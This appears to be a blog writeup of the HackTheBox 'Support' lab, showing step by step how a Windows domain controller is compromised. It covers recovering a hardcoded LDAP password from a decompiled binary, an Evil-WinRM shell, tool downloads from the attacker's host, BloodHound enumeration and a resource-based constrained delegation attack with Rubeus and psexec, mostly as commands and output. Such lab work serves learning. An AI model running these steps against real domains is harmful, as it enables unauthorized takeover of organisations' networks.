---
title: HackTheBox Support Machine Writeup
date: 2023-07-06T11:17:38.517Z
tags:
  - writeup
description: My solution for the HackTheBox machine called "Support"
---


```csharp
  public LdapQuery()
  {
      string password = Protected.getPassword();
      this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
      this.entry.AuthenticationType = AuthenticationTypes.Secure;
      this.ds = new DirectorySearcher(this.entry);
  }
```

The target machine resided on the address `10.129.227.255` and I modified by hosts file as follows:

```
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.227.255  support.htb
...
```

With this in place, I could then refer to `support.htb`, rather than supplying the IP address each time.

## Reconnaissance

I started with an `nmap` scan to discover running services and open ports.

```shell
$ nmap -sV -Pn support.htb
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-06 08:05:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From this I deduced that the target machine was running Windows with active directory, as hinted at by the LDAP service, amoungst others. There was also an SMB service present, so I started by enumerating the SMB file share.

## Enumerating SMB

I used the `smbclient` tool to enumerate all of the shares in the SMB service, and noticed an out-of-the-ordinary share called `support-tools.`

```
$ smbclient -L \\support.htb
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share 
    support-tools   Disk      support staff tools
    SYSVOL          Disk      Logon server share 
```

I then examined the contents of the support-tools share.

```
$ smbclient --no-pass \\\\support.htb\\support-tools
smb: \> dir
  .
  ..
  7-ZipPortable_21.07.paf.exe
  npp.8.4.1.portable.x64.zip
  putty.exe
  SysInternalsSuite.zip
  UserInfo.exe.zip
  windirstat1_1_2_setup.exe
  WiresharkPortable64_3.6.5.paf.exe
```

## Debugging UserInfo.exe with DNSpy.

The file UserInfo.exe.zip looked interesting to me, so I copied over to my kali machine, unzipped it and examined the contents. It seemed to be a windows executable program. I used mono to execute the program on my kali machine.

```
$ mono UserInfo.exe
Usage: UserInfo.exe [options] [commands]

Options:
  -v --verbose    Verbose output
 
Commands:
  find            Find a user
  user            Get information about a user
```

This program seemed to pull information about users, however I wasn't sure from what data source (database, active directory, etc). Active Directory seemed likely, given what I found in the reconnaissance phase.

Next, I opened the executable in `DNSpy`, which is a .NET debugger. This allowed me to look at the source code of the application.

![](/img/dnspy.png)

As I suspected, the application seems to be using LDAP to query active directory. Inside the `Userinfo.Services.LdapQuery` class I found the following function. The following function authenticates to the LDAP service with the username `support\\ldap` , and a password which is decoded within the application.

```csharp
  public LdapQuery()
  {
      string password = Protected.getPassword();
      this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
      this.entry.AuthenticationType = AuthenticationTypes.Secure;
      this.ds = new DirectorySearcher(this.entry);
  }
```

I followed the trail of this to the `Protected` class, where the `getPassword()` function was located, as well as relevant variable definitions.

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	return Encoding.Default.GetString(array2);
}
```

## Replicating the getPassword Function

I asked ChatGPT to re-create this script in python so that I can run it easily, and retreive the LDAP password. Below is the script I received from ChatGPT.

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando".encode('ascii')

def get_password():
    array = bytearray(base64.b64decode(enc_password))
    array2 = bytearray(array)
    for i in range(len(array)):
        array2[i] = array[i] ^ key[i % len(key)] ^ 223
    return array2.decode("latin-1")

password = get_password()
print(f"the password is : {password}")
```

This script produced the result of:

```
the password is : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

## Leveraging LDAP

Now that I have a pair of working LDAP credentials (`support\\ldap, nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`), I can authenticate to the LDAP server and begin to enumerate users. I used a tool called `ldapsearch` for this.

```shell
$ ldapsearch -x -H ldap://support.htb -D 'support\ldap' \
             -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
             -b 'CN=Users,DC=support,DC=htb'
```

After a very long time of banging my head against a wall, I noticed the support account has an info attribute with a password-like value. What drew my attention to this particular account was the fact that it did not seem like a regular active directory account, and that it was a similar name to the name of the box. Nothing technical, but sometimes random thoughts get you to the correct places!  

```
# support, Users, support.htb
...
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
...
```

## Getting a Reverse Shell & User Flag

I now had a valid set of active directory credentials (`username: support, password: Ironside47pleasure40Watchful`). I originally thought about using PSexec or RDP to log into the system, but I stumbled across `Evil-WinRM`, which I had actually never used previously, so I used that to get a powershell reverse shell on the machine and retireve the user flag.

```shell
$ git clone https://github.com/Hackplayers/evil-winrm.git
$ cd evil-winrm
$ sudo gem install winrm winrm-fs stringio logger fileutils
$ ruby evil-winrm.rb -i support.htb -u support -p Ironside47pleasure40Watchful
Evil-WinRM> cd C:\Users\Support\Desktop
Evil-WinRM> type user.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

## Visualising AD with Bloodhound

I was very unsure as to what to do next in order to escalate my privileges, after some research online I decided to check for any privilege misconfigurations within the active directory environment. To do this, I used a tool called [`Bloodhound`](https://github.com/BloodHoundAD/BloodHound) (and [`Sharphound`](https://github.com/BloodHoundAD/SharpHound)).

Installing and setting up Bloodhound is a pain, I will leave a guide that I used below. Bloodhound is one of those tools where I have to look up how to set it up every single time I use it.

[Installing and setting up Bloodhound](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)

I also needed to get Sharphound on the target machine, so I copied it over with Python HTTP server.

```shell
$ python3 -m http.server
Evil-WinRM> curl http://<KALI_IP>:8000/SharpHound.exe
...
Evil-WinRM> ./SharpHound.exe --CollectionMethods All
Evil-WinRM> download 20230706022421_BloodHound.zip # Name may vary
```

The above commands executed Sharphound, which enumerated lots of information about the active directory environment, allowing us to look for misconfigurations to leverage. I then copied the remote zip file from Sharphound to my kali machine, ready for me to import into bloodhound.

I started bloodhound:

```shell
$ sudo bloodhound
```

Then, within the bloodhound interface, I navigated to upload, selected all of the `.json` files from the Sharphound output (after extracting the zip archive), and pressed upload.

Bloodhound allowed me to perform a lot of analysis on the AD environment, such as dangerous privileges, shortest paths to domain adminstrator accounts, and possible kerberoastable accounts. Under the "`Shortest Path to Unconstrainted Delegation Systems`" analysis, I noticed that the `SHARED SUPPORT ACCOUNTS`, which the "`support`" account that I had compromised was part of, had a `GenericAll` privilege to the `support.htb` domain controller.

![](/img/bloodhound.png)

## Exploiting Constraint Delegation

`GenericAll` privilege sounded promising for a privilege escalation, so I began to research and came across [this](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation) HackTricks entry about resource-based constrained delegation (sounds scary), which had a basic walkthrough of exploiting a misconfiguration wherein I had the `GenericAll `privilege over another computer (the domain controller (DC), in this case).

Because I have write equivalent privileges over the domain controller account, I can obtain privileged access to that machine, meaning I can execute commands as the administrator, by creating a kerberos ticket and impersonating them. I followed the referenced guide as shown below.

```shell
# First I needed to import the powermad module, and clone some other tools
$ git clone https://github.com/Kevin-Robertson/Powermad.git
$ git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/Rubeus...
$ git clone https://github.com/zer1t0/ticket_converter.git
$ python -m http.server
Evil-WinRM> curl http://<KALI_IP>:8000/Powermad.ps1
Evil-WinRM> Import-Module ./Powermad.ps1
# Create a new machine account called SERVICEA with password 123456
Evil-WinRM> New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
...
# Get a reference to the newly created machine
Evil-WinRM> $targetComputer = Get-ADComputer SERVICEA
# Assign the delegation privileges to the new account (allow account to impersonate)
Evil-WinRM> Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$
Evil-WinRM> upload ../Rubeus.exe
# I need the hash of the new user password (123456), can use rubeus for this.
Evil-WinRM> ./Rubeus.exe hash /password:123456 /user:SERVICEA /domain:support.htb
...
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 1C1640AE60125CD8D7F659FEF455191E
[*]       aes256_cts_hmac_sha1 : E06A832AD99986ABABBA605788D138CB97B1AAA4052F3BBF8432E12880587AB7
[*]       des_cbc_md5          : F1239B235BECB670
# Note AES and RC4.
# Perform the attack - get the tickets
Evil-WinRM> ./Rubeus.exe s4u /user:SERVICEA$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
# Next, I copied the ticket to my kali machine (ticketb64)
# Remove all spaces from the file
$ cat ticketb64 | tr -d " \t\n\r" > ticketb64
# Base64 decode and change name to convert to ccache file.
$ base64 -d ticketb64 > ticket.kirbi
$ python3 ticket_converter.py ticket.kirbi ticket.ccache
# Then I used psexec to use the ticket and impersonate the administrator.
$ cd /usr/share/doc/python3-impacket/examples
$ python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass
...
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C://Users//Administrator//Desktop
C:\Windows\system32> type root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```